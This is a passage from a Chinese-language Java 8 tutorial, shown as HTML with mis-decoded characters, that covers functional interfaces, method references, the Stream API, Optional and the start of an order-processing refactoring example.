        System.out.println(<span class="hljs-string">"è¿™æ˜¯ä¸€ä¸ªè®¡ç®—å™¨æ¥å£"</span>);
    }
}

<span class="hljs-comment">// ä½¿ç”¨è‡ªå®šä¹‰å‡½æ•°å¼æ¥å£</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FunctionalInterfaceDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// åŠ æ³•å®ç°</span>
        <span class="hljs-type">Calculator</span> <span class="hljs-variable">addition</span> <span class="hljs-operator">=</span> (a, b) -&gt; a + b;
        System.out.println(<span class="hljs-string">"åŠ æ³•ï¼š"</span> + addition.calculate(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>));
        
        <span class="hljs-comment">// å‡æ³•å®ç°</span>
        <span class="hljs-type">Calculator</span> <span class="hljs-variable">subtraction</span> <span class="hljs-operator">=</span> (a, b) -&gt; a - b;
        System.out.println(<span class="hljs-string">"å‡æ³•ï¼š"</span> + subtraction.calculate(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>));
        
        <span class="hljs-comment">// ä¹˜æ³•å®ç°</span>
        <span class="hljs-type">Calculator</span> <span class="hljs-variable">multiplication</span> <span class="hljs-operator">=</span> (a, b) -&gt; a * b;
        multiplication.printResult(multiplication.calculate(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>));
        
        <span class="hljs-comment">// è°ƒç”¨é™æ€æ–¹æ³•</span>
        Calculator.printInfo();
    }
}
</code></pre>
<h3 data-id="heading-6">Javaå†…ç½®çš„å‡½æ•°å¼æ¥å£</h3>
<p>Java 8åœ¨<code>java.util.function</code>åŒ…ä¸­æä¾›äº†ä¸°å¯Œçš„å‡½æ•°å¼æ¥å£ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.function.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BuiltInFunctionalInterfaces</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 1. Predicate&lt;T&gt; - æ–­è¨€ï¼Œè¿”å›å¸ƒå°”å€¼</span>
        Predicate&lt;String&gt; isNotEmpty = s -&gt; s != <span class="hljs-literal">null</span> &amp;&amp; !s.isEmpty();
        System.out.println(<span class="hljs-string">"å­—ç¬¦ä¸²æ˜¯å¦éç©ºï¼š"</span> + isNotEmpty.test(<span class="hljs-string">"Hello"</span>));
        
        <span class="hljs-comment">// 2. Function&lt;T, R&gt; - å‡½æ•°ï¼Œæ¥å—Tè¿”å›R</span>
        Function&lt;String, Integer&gt; stringLength = String::length;
        System.out.println(<span class="hljs-string">"å­—ç¬¦ä¸²é•¿åº¦ï¼š"</span> + stringLength.apply(<span class="hljs-string">"Java"</span>));
        
        <span class="hljs-comment">// 3. Consumer&lt;T&gt; - æ¶ˆè´¹è€…ï¼Œæ¥å—Tæ— è¿”å›å€¼</span>
        Consumer&lt;String&gt; printer = System.out::println;
        printer.accept(<span class="hljs-string">"ä½ å¥½ï¼ŒJavaï¼"</span>);
        
        <span class="hljs-comment">// 4. Supplier&lt;T&gt; - ä¾›åº”è€…ï¼Œæ— å‚è¿”å›T</span>
        Supplier&lt;Double&gt; randomSupplier = Math::random;
        System.out.println(<span class="hljs-string">"éšæœºæ•°ï¼š"</span> + randomSupplier.get());
        
        <span class="hljs-comment">// 5. UnaryOperator&lt;T&gt; - ä¸€å…ƒæ“ä½œï¼Œç»§æ‰¿Function&lt;T, T&gt;</span>
        UnaryOperator&lt;String&gt; toUpperCase = String::toUpperCase;
        System.out.println(<span class="hljs-string">"å¤§å†™ï¼š"</span> + toUpperCase.apply(<span class="hljs-string">"java"</span>));
        
        <span class="hljs-comment">// 6. BinaryOperator&lt;T&gt; - äºŒå…ƒæ“ä½œï¼Œç»§æ‰¿BiFunction&lt;T, T, T&gt;</span>
        BinaryOperator&lt;Integer&gt; max = Math::max;
        System.out.println(<span class="hljs-string">"æœ€å¤§å€¼ï¼š"</span> + max.apply(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>));
    }
    
    <span class="hljs-comment">// å‡½æ•°å¼æ¥å£çš„ç»„åˆ</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">functionComposition</span><span class="hljs-params">()</span> {
        Function&lt;Integer, Integer&gt; multiplyBy2 = x -&gt; x * <span class="hljs-number">2</span>;
        Function&lt;Integer, Integer&gt; add3 = x -&gt; x + <span class="hljs-number">3</span>;
        
        <span class="hljs-comment">// ç»„åˆå‡½æ•°ï¼šå…ˆä¹˜2å†åŠ 3</span>
        Function&lt;Integer, Integer&gt; multiplyThenAdd = multiplyBy2.andThen(add3);
        System.out.println(<span class="hljs-string">"5 * 2 + 3 = "</span> + multiplyThenAdd.apply(<span class="hljs-number">5</span>));
        
        <span class="hljs-comment">// ç»„åˆå‡½æ•°ï¼šå…ˆåŠ 3å†ä¹˜2</span>
        Function&lt;Integer, Integer&gt; addThenMultiply = multiplyBy2.compose(add3);
        System.out.println(<span class="hljs-string">"(5 + 3) * 2 = "</span> + addThenMultiply.apply(<span class="hljs-number">5</span>));
        
        <span class="hljs-comment">// Predicateçš„ç»„åˆ</span>
        Predicate&lt;String&gt; startsWithJ = s -&gt; s.startsWith(<span class="hljs-string">"J"</span>);
        Predicate&lt;String&gt; endsWithA = s -&gt; s.endsWith(<span class="hljs-string">"a"</span>);
        
        Predicate&lt;String&gt; startsWithJAndEndsWithA = startsWithJ.and(endsWithA);
        System.out.println(<span class="hljs-string">"Javaæ˜¯å¦ç¬¦åˆï¼š"</span> + startsWithJAndEndsWithA.test(<span class="hljs-string">"Java"</span>));
        
        Predicate&lt;String&gt; startsWithJOrEndsWithA = startsWithJ.or(endsWithA);
        System.out.println(<span class="hljs-string">"Pythonæ˜¯å¦ç¬¦åˆï¼š"</span> + startsWithJOrEndsWithA.test(<span class="hljs-string">"Python"</span>));
    }
}
</code></pre>
<h2 data-id="heading-7">æ–¹æ³•å¼•ç”¨ï¼šè®©Lambdaæ›´ç®€æ´</h2>
<p>æ–¹æ³•å¼•ç”¨æ˜¯<code>Lambda</code>è¡¨è¾¾å¼çš„ç®€å†™å½¢å¼ï¼Œå…±æœ‰å››ç§ç±»å‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.Arrays;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MethodReferenceExample</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        List&lt;String&gt; names = Arrays.asList(<span class="hljs-string">"Alice"</span>, <span class="hljs-string">"Bob"</span>, <span class="hljs-string">"Charlie"</span>, <span class="hljs-string">"David"</span>);
        
        <span class="hljs-comment">// 1. é™æ€æ–¹æ³•å¼•ç”¨</span>
        names.forEach(System.out::println);
        
        <span class="hljs-comment">// 2. å®ä¾‹æ–¹æ³•å¼•ç”¨ï¼ˆç‰¹å®šå¯¹è±¡çš„å®ä¾‹æ–¹æ³•ï¼‰</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">prefix</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Mr. "</span>;
        names.forEach(prefix::concat);  <span class="hljs-comment">// ç­‰åŒäº s -&gt; prefix.concat(s)</span>
        
        <span class="hljs-comment">// 3. å®ä¾‹æ–¹æ³•å¼•ç”¨ï¼ˆä»»æ„å¯¹è±¡çš„å®ä¾‹æ–¹æ³•ï¼‰</span>
        names.forEach(String::toUpperCase);  <span class="hljs-comment">// ç­‰åŒäº s -&gt; s.toUpperCase()</span>
        
        <span class="hljs-comment">// 4. æ„é€ å™¨å¼•ç”¨</span>
        List&lt;String&gt; strings = Arrays.asList(<span class="hljs-string">"1"</span>, <span class="hljs-string">"2"</span>, <span class="hljs-string">"3"</span>);
        List&lt;Integer&gt; numbers = strings.stream()
                                      .map(Integer::<span class="hljs-keyword">new</span>)  <span class="hljs-comment">// ç­‰åŒäº s -&gt; new Integer(s)</span>
                                      .toList();
    }
    
    <span class="hljs-comment">// æ–¹æ³•å¼•ç”¨çš„å®é™…åº”ç”¨</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">practicalExamples</span><span class="hljs-params">()</span> {
        List&lt;Person&gt; people = Arrays.asList(
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"Alice"</span>, <span class="hljs-number">25</span>),
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"Bob"</span>, <span class="hljs-number">30</span>),
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"Charlie"</span>, <span class="hljs-number">20</span>)
        );
        
        <span class="hljs-comment">// æŒ‰å¹´é¾„æ’åºï¼ˆä½¿ç”¨Comparator.comparingå’Œå®ä¾‹æ–¹æ³•å¼•ç”¨ï¼‰</span>
        people.sort(Comparator.comparing(Person::getAge));
        
        <span class="hljs-comment">// æå–æ‰€æœ‰åå­—</span>
        List&lt;String&gt; names = people.stream()
                                  .map(Person::getName)  <span class="hljs-comment">// å®ä¾‹æ–¹æ³•å¼•ç”¨</span>
                                  .toList();
        
        <span class="hljs-comment">// åˆ›å»ºæ–°Personåˆ—è¡¨ï¼ˆä½¿ç”¨æ„é€ å™¨å¼•ç”¨ï¼‰</span>
        List&lt;Person&gt; clonedPeople = people.stream()
                                         .map(Person::<span class="hljs-keyword">new</span>)  <span class="hljs-comment">// å¤åˆ¶æ„é€ å™¨</span>
                                         .toList();
    }
    
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
        <span class="hljs-keyword">private</span> String name;
        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;
        
        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
            <span class="hljs-built_in">this</span>.name = name;
            <span class="hljs-built_in">this</span>.age = age;
        }
        
        <span class="hljs-comment">// å¤åˆ¶æ„é€ å™¨</span>
        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(Person other)</span> {
            <span class="hljs-built_in">this</span>.name = other.name;
            <span class="hljs-built_in">this</span>.age = other.age;
        }
        
        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> name; }
        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> age; }
    }
}
</code></pre>
<h2 data-id="heading-8">Stream APIï¼šé›†åˆçš„å‡½æ•°å¼æ“ä½œ</h2>
<p>Stream APIæ˜¯Java 8å¼•å…¥çš„æœ€é‡è¦ç‰¹æ€§ä¹‹ä¸€ï¼Œå®ƒæä¾›äº†å¯¹é›†åˆæ•°æ®çš„å‡½æ•°å¼å¤„ç†èƒ½åŠ›ã€‚</p>
<h3 data-id="heading-9">Streamçš„åŸºæœ¬æ“ä½œ</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.*;
<span class="hljs-keyword">import</span> java.util.stream.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StreamAPIExample</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        List&lt;Integer&gt; numbers = Arrays.asList(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>);
        
        <span class="hljs-comment">// 1. åˆ›å»ºStream</span>
        Stream&lt;Integer&gt; stream1 = numbers.stream();          <span class="hljs-comment">// ä»é›†åˆåˆ›å»º</span>
        Stream&lt;String&gt; stream2 = Stream.of(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>);    <span class="hljs-comment">// ç›´æ¥åˆ›å»º</span>
        Stream&lt;Integer&gt; stream3 = Stream.iterate(<span class="hljs-number">0</span>, n -&gt; n + <span class="hljs-number">1</span>).limit(<span class="hljs-number">10</span>); <span class="hljs-comment">// æ— é™æµ</span>
        
        <span class="hljs-comment">// 2. ä¸­é—´æ“ä½œï¼ˆè¿”å›æ–°Streamï¼‰</span>
        List&lt;Integer&gt; evenNumbers = numbers.stream()
            .filter(n -&gt; n % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>)      <span class="hljs-comment">// è¿‡æ»¤å¶æ•°</span>
            .map(n -&gt; n * <span class="hljs-number">2</span>)              <span class="hljs-comment">// æ¯ä¸ªå…ƒç´ ä¹˜ä»¥2</span>
            .sorted((a, b) -&gt; b - a)      <span class="hljs-comment">// å€’åºæ’åº</span>
            .collect(Collectors.toList()); <span class="hljs-comment">// æ”¶é›†ç»“æœ</span>
        
        System.out.println(<span class="hljs-string">"å¤„ç†åçš„å¶æ•°ï¼š"</span> + evenNumbers);
        
        <span class="hljs-comment">// 3. ç»ˆç«¯æ“ä½œï¼ˆäº§ç”Ÿç»“æœæˆ–å‰¯ä½œç”¨ï¼‰</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> numbers.stream().count();
        Optional&lt;Integer&gt; max = numbers.stream().max(Integer::compare);
        Optional&lt;Integer&gt; min = numbers.stream().min(Integer::compare);
        <span class="hljs-type">Integer</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> numbers.stream().reduce(<span class="hljs-number">0</span>, Integer::sum);
        
        System.out.println(<span class="hljs-string">"æ€»æ•°ï¼š"</span> + count);
        System.out.println(<span class="hljs-string">"æœ€å¤§å€¼ï¼š"</span> + max.orElse(<span class="hljs-number">0</span>));
        System.out.println(<span class="hljs-string">"æœ€å°å€¼ï¼š"</span> + min.orElse(<span class="hljs-number">0</span>));
        System.out.println(<span class="hljs-string">"æ€»å’Œï¼š"</span> + sum);
    }
    
    <span class="hljs-comment">// æ›´å¤æ‚çš„Streamæ“ä½œ</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">advancedStreamOperations</span><span class="hljs-params">()</span> {
        List&lt;Student&gt; students = Arrays.asList(
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">"Alice"</span>, Arrays.asList(<span class="hljs-string">"Math"</span>, <span class="hljs-string">"Physics"</span>, <span class="hljs-string">"Chemistry"</span>)),
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">"Bob"</span>, Arrays.asList(<span class="hljs-string">"Math"</span>, <span class="hljs-string">"Biology"</span>, <span class="hljs-string">"History"</span>)),
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">"Charlie"</span>, Arrays.asList(<span class="hljs-string">"Physics"</span>, <span class="hljs-string">"Chemistry"</span>, <span class="hljs-string">"Computer Science"</span>))
        );
        
        <span class="hljs-comment">// è·å–æ‰€æœ‰ä¸é‡å¤çš„è¯¾ç¨‹</span>
        List&lt;String&gt; allCourses = students.stream()
            .flatMap(student -&gt; student.getCourses().stream())  <span class="hljs-comment">// æ‰å¹³åŒ–</span>
            .distinct()                                         <span class="hljs-comment">// å»é‡</span>
            .sorted()                                           <span class="hljs-comment">// æ’åº</span>
            .collect(Collectors.toList());
        
        System.out.println(<span class="hljs-string">"æ‰€æœ‰è¯¾ç¨‹ï¼š"</span> + allCourses);
        
        <span class="hljs-comment">// åˆ†ç»„æ“ä½œï¼šæŒ‰è¯¾ç¨‹é•¿åº¦åˆ†ç»„</span>
        Map&lt;Integer, List&lt;String&gt;&gt; groupedByLength = allCourses.stream()
            .collect(Collectors.groupingBy(String::length));
        
        System.out.println(<span class="hljs-string">"æŒ‰é•¿åº¦åˆ†ç»„ï¼š"</span> + groupedByLength);
        
        <span class="hljs-comment">// åˆ†åŒºæ“ä½œï¼šåŒºåˆ†é•¿è¯¾ç¨‹å’ŒçŸ­è¯¾ç¨‹</span>
        Map&lt;Boolean, List&lt;String&gt;&gt; partitioned = allCourses.stream()
            .collect(Collectors.partitioningBy(course -&gt; course.length() &gt; <span class="hljs-number">10</span>));
        
        System.out.println(<span class="hljs-string">"é•¿è¯¾ç¨‹ï¼š"</span> + partitioned.get(<span class="hljs-literal">true</span>));
        System.out.println(<span class="hljs-string">"çŸ­è¯¾ç¨‹ï¼š"</span> + partitioned.get(<span class="hljs-literal">false</span>));
        
        <span class="hljs-comment">// ç»Ÿè®¡ä¿¡æ¯</span>
        <span class="hljs-type">IntSummaryStatistics</span> <span class="hljs-variable">stats</span> <span class="hljs-operator">=</span> students.stream()
            .mapToInt(student -&gt; student.getCourses().size())
            .summaryStatistics();
        
        System.out.println(<span class="hljs-string">"è¯¾ç¨‹æ•°ç»Ÿè®¡ï¼š"</span>);
        System.out.println(<span class="hljs-string">"  å¹³å‡ï¼š"</span> + stats.getAverage());
        System.out.println(<span class="hljs-string">"  æœ€å¤šï¼š"</span> + stats.getMax());
        System.out.println(<span class="hljs-string">"  æœ€å°‘ï¼š"</span> + stats.getMin());
        System.out.println(<span class="hljs-string">"  æ€»æ•°ï¼š"</span> + stats.getSum());
    }
    
    <span class="hljs-comment">// å¹¶è¡ŒStream</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">parallelStreamExample</span><span class="hljs-params">()</span> {
        List&lt;Integer&gt; numbers = IntStream.rangeClosed(<span class="hljs-number">1</span>, <span class="hljs-number">1000000</span>)
            .boxed()
            .collect(Collectors.toList());
        
        <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        <span class="hljs-type">long</span> <span class="hljs-variable">sequentialSum</span> <span class="hljs-operator">=</span> numbers.stream()
            .mapToLong(Integer::longValue)
            .sum();
        <span class="hljs-type">long</span> <span class="hljs-variable">sequentialTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis() - startTime;
        
        startTime = System.currentTimeMillis();
        <span class="hljs-type">long</span> <span class="hljs-variable">parallelSum</span> <span class="hljs-operator">=</span> numbers.parallelStream()
            .mapToLong(Integer::longValue)
            .sum();
        <span class="hljs-type">long</span> <span class="hljs-variable">parallelTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis() - startTime;
        
        System.out.println(<span class="hljs-string">"é¡ºåºæµè€—æ—¶ï¼š"</span> + sequentialTime + <span class="hljs-string">"ms"</span>);
        System.out.println(<span class="hljs-string">"å¹¶è¡Œæµè€—æ—¶ï¼š"</span> + parallelTime + <span class="hljs-string">"ms"</span>);
        System.out.println(<span class="hljs-string">"åŠ é€Ÿæ¯”ï¼š"</span> + (<span class="hljs-type">double</span>) sequentialTime / parallelTime);
        
        <span class="hljs-comment">// æ³¨æ„ï¼šå¹¶è¡Œæµå¹¶ä¸æ€»æ˜¯æ›´å¿«ï¼Œéœ€è¦è€ƒè™‘ï¼š</span>
        <span class="hljs-comment">// 1. æ•°æ®é‡æ˜¯å¦è¶³å¤Ÿå¤§</span>
        <span class="hljs-comment">// 2. æ“ä½œæ˜¯å¦è¶³å¤Ÿè€—æ—¶</span>
        <span class="hljs-comment">// 3. æ˜¯å¦å®¹æ˜“åˆ†å‰²</span>
    }
    
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> {
        <span class="hljs-keyword">private</span> String name;
        <span class="hljs-keyword">private</span> List&lt;String&gt; courses;
        
        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, List&lt;String&gt; courses)</span> {
            <span class="hljs-built_in">this</span>.name = name;
            <span class="hljs-built_in">this</span>.courses = courses;
        }
        
        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> name; }
        <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">getCourses</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> courses; }
    }
}
</code></pre>
<h2 data-id="heading-10">Optionalï¼šä¼˜é›…å¤„ç†nullå€¼</h2>
<p>Optionalæ˜¯Java 8å¼•å…¥çš„å®¹å™¨ç±»ï¼Œç”¨äºåŒ…è£…å¯èƒ½ä¸ºnullçš„å€¼ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.Optional;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OptionalExample</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// åˆ›å»ºOptionalå¯¹è±¡</span>
        Optional&lt;String&gt; optional1 = Optional.of(<span class="hljs-string">"Hello"</span>);      <span class="hljs-comment">// å€¼ä¸èƒ½ä¸ºnull</span>
        Optional&lt;String&gt; optional2 = Optional.ofNullable(<span class="hljs-literal">null</span>); <span class="hljs-comment">// å€¼å¯ä»¥ä¸ºnull</span>
        Optional&lt;String&gt; optional3 = Optional.empty();          <span class="hljs-comment">// ç©ºOptional</span>
        
        <span class="hljs-comment">// ä¼ ç»Ÿnullæ£€æŸ¥æ–¹å¼</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">traditionalResult</span> <span class="hljs-operator">=</span> getTraditionalValue();
        <span class="hljs-keyword">if</span> (traditionalResult != <span class="hljs-literal">null</span>) {
            System.out.println(<span class="hljs-string">"ä¼ ç»Ÿæ–¹å¼ï¼š"</span> + traditionalResult.toUpperCase());
        }
        
        <span class="hljs-comment">// Optionalæ–¹å¼</span>
        Optional&lt;String&gt; optionalValue = getOptionalValue();
        optionalValue.ifPresent(value -&gt; 
            System.out.println(<span class="hljs-string">"Optionalæ–¹å¼ï¼š"</span> + value.toUpperCase()));
        
        <span class="hljs-comment">// é“¾å¼æ“ä½œ</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> getOptionalValue()
            .map(String::toUpperCase)
            .filter(s -&gt; s.length() &gt; <span class="hljs-number">3</span>)
            .orElse(<span class="hljs-string">"é»˜è®¤å€¼"</span>);
        
        System.out.println(<span class="hljs-string">"é“¾å¼æ“ä½œç»“æœï¼š"</span> + result);
        
        <span class="hljs-comment">// æ›´å¤æ‚çš„é“¾å¼æ“ä½œ</span>
        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"Alice"</span>, 
            Optional.of(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Address</span>(
                Optional.of(<span class="hljs-string">"Main Street"</span>), 
                <span class="hljs-string">"New York"</span>)));
        
        <span class="hljs-type">String</span> <span class="hljs-variable">street</span> <span class="hljs-operator">=</span> person.getAddress()
            .flatMap(Address::getStreet)
            .orElse(<span class="hljs-string">"æœªçŸ¥è¡—é“"</span>);
        
        System.out.println(<span class="hljs-string">"è¡—é“ï¼š"</span> + street);
    }
    
    <span class="hljs-comment">// å®é™…åº”ç”¨ï¼šé¿å…æ·±å±‚nullæ£€æŸ¥</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processUser</span><span class="hljs-params">(User user)</span> {
        <span class="hljs-comment">// ä¼ ç»Ÿæ–¹å¼ï¼ˆç¹çä¸”å®¹æ˜“å‡ºé”™ï¼‰</span>
        <span class="hljs-keyword">if</span> (user != <span class="hljs-literal">null</span>) {
            <span class="hljs-type">Profile</span> <span class="hljs-variable">profile</span> <span class="hljs-operator">=</span> user.getProfile();
            <span class="hljs-keyword">if</span> (profile != <span class="hljs-literal">null</span>) {
                <span class="hljs-type">Address</span> <span class="hljs-variable">address</span> <span class="hljs-operator">=</span> profile.getAddress();
                <span class="hljs-keyword">if</span> (address != <span class="hljs-literal">null</span>) {
                    <span class="hljs-type">String</span> <span class="hljs-variable">city</span> <span class="hljs-operator">=</span> address.getCity();
                    <span class="hljs-keyword">if</span> (city != <span class="hljs-literal">null</span>) {
                        System.out.println(city.toUpperCase());
                    }
                }
            }
        }
        
        <span class="hljs-comment">// Optionalæ–¹å¼ï¼ˆç®€æ´å®‰å…¨ï¼‰</span>
        Optional.ofNullable(user)
            .map(User::getProfile)
            .map(Profile::getAddress)
            .map(Address::getCity)
            .ifPresent(city -&gt; System.out.println(city.toUpperCase()));
    }
    
    <span class="hljs-comment">// ç¤ºä¾‹æ–¹æ³•</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getTraditionalValue</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> Math.random() &gt; <span class="hljs-number">0.5</span> ? <span class="hljs-string">"Hello"</span> : <span class="hljs-literal">null</span>;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Optional&lt;String&gt; <span class="hljs-title function_">getOptionalValue</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> Math.random() &gt; <span class="hljs-number">0.5</span> ? Optional.of(<span class="hljs-string">"Hello"</span>) : Optional.empty();
    }
    
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
        <span class="hljs-keyword">private</span> String name;
        <span class="hljs-keyword">private</span> Optional&lt;Address&gt; address;
        
        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, Optional&lt;Address&gt; address)</span> {
            <span class="hljs-built_in">this</span>.name = name;
            <span class="hljs-built_in">this</span>.address = address;
        }
        
        <span class="hljs-keyword">public</span> Optional&lt;Address&gt; <span class="hljs-title function_">getAddress</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> address;
        }
    }
    
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Address</span> {
        <span class="hljs-keyword">private</span> Optional&lt;String&gt; street;
        <span class="hljs-keyword">private</span> String city;
        
        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Address</span><span class="hljs-params">(Optional&lt;String&gt; street, String city)</span> {
            <span class="hljs-built_in">this</span>.street = street;
            <span class="hljs-built_in">this</span>.city = city;
        }
        
        <span class="hljs-keyword">public</span> Optional&lt;String&gt; <span class="hljs-title function_">getStreet</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> street;
        }
        
        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCity</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> city;
        }
    }
    
    <span class="hljs-comment">// æ¼”ç¤ºç”¨çš„ç±»</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
        <span class="hljs-keyword">private</span> Profile profile;
        <span class="hljs-keyword">public</span> Profile <span class="hljs-title function_">getProfile</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> profile; }
    }
    
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Profile</span> {
        <span class="hljs-keyword">private</span> Address address;
        <span class="hljs-keyword">public</span> Address <span class="hljs-title function_">getAddress</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> address; }
    }
}
</code></pre>
<h2 data-id="heading-11">å®æˆ˜ï¼šé‡æ„ä¼ ç»Ÿä»£ç ä¸ºå‡½æ•°å¼é£æ ¼</h2>
<h3 data-id="heading-12">æ¡ˆä¾‹1ï¼šå¤„ç†è®¢å•åˆ—è¡¨</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.*;
<span class="hljs-keyword">import</span> java.util.stream.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderProcessor</span> {
    
    <span class="hljs-comment">// ä¼ ç»Ÿæ–¹å¼</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TraditionalOrderProcessor</span> {
        <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">calculateTotalRevenue</span><span class="hljs-params">(List&lt;Order&gt; orders)</span> {
            <span class="hljs-type">double</span> <span class="hljs-variable">total</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
            <span class="hljs-keyword">for</span> (Order order : orders) {
                <span class="hljs-keyword">if</span> (order.getStatus() == OrderStatus.COMPLETED) {
                    <span class="hljs-keyword">for</span> (OrderItem item : order.getItems()) {
                        total += item.getPrice() * item.getQuantity();
                    }
                }
            }
            <span class="hljs-keyword">return</span> total;
        }
        
        <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">getCustomerNames</span><span class="hljs-params">(List&lt;Order&gt; orders)</span> {
